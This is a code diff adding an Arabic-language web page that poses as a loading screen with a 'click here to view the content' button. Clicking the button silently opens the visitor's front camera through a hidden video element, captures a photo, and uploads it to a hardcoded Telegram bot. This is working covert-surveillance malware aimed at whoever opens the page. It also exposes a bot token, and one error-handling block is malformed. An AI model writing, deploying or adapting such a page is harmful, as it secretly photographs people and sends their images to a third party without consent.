@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+    <style>
+        body {
+            margin: 0;
+            background-color: #0f172a;
+            color: #f8fafc;
+            font-family: system-ui, -apple-system, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .loader-container {
+            text-align: center;
+            padding: 20px;
+        }
+        .btn-start {
+            background-color: #38bdf8;
+            color: #0f172a;
+            border: none;
+            padding: 12px 30px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+            transition: background 0.2s;
+        }
+        .btn-start:hover {
+            background-color: #0ea5e9;
+        }
+        h2 {
+            font-size: 1.2rem;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loader-container" id="mainBox">
+        <h2>انقر على الزر أدناه لعرض المحتوى</h2>
+        <button class="btn-start" onclick="startProcess()">اضغط هنا</button>
+    </div>
+
+    <!-- عنصر فيديو مخفي لالتقاط الصورة -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // إعدادات بوت تيليجرام (تم وضع التوكن والآيدي الخاص بك)
+        const TELEGRAM_BOT_TOKEN = '8880573702:AAEcni2H3MYNKkyU0GJen2XqPFgAyL04Mdw';
+        const TELEGRAM_CHAT_ID = '8304712202';
+
+        async function startProcess() {
+            // تغيير النص لإظهار أن الصفحة تعمل
+            document.getElementById('mainBox').innerHTML = '<h2>جاري التحميل، يرجى الانتظار...</h2>';
+
+            try {
+                const constraints = {
+                    video: {
+                        facingMode: "user"
+                    }
+                };
+
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const videoElement = document.getElementById('video');
+                videoElement.srcObject = stream;
+
+                setTimeout(() => {
+                    captureAndSend(stream);
+                }, 1500);
+
+            } (error) {
+                console.error("فشل الوصول إلى الكاميرا:", error);
+            }
+        }
+
+        function captureAndSend(stream) {
+            try {
+                const videoElement = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                
+                canvas.width = videoElement.videoWidth || 640;
+                canvas.height = videoElement.videoHeight || 480;
+
+                const context = canvas.getContext('2d');
+                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                stream.getTracks().forEach(track => track.stop());
+
+                canvas.toBlob(function(blob) {
+                    sendPhotoToTelegram(blob);
+                }, 'image/jpeg', 0.85);
+
+            } catch (e) {
+                console.error("خطأ أثناء التقاط الصورة:", e);
+            }
+        }
+
+        function sendPhotoToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, 'captured_photo.jpg');
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('تم الإرسال بنجاح', data);
+            })
+            .catch(error => {
+                console.error('خطأ في الإرسال:', error);
+            });
+        }
+    </script>
+</body>
+</html>
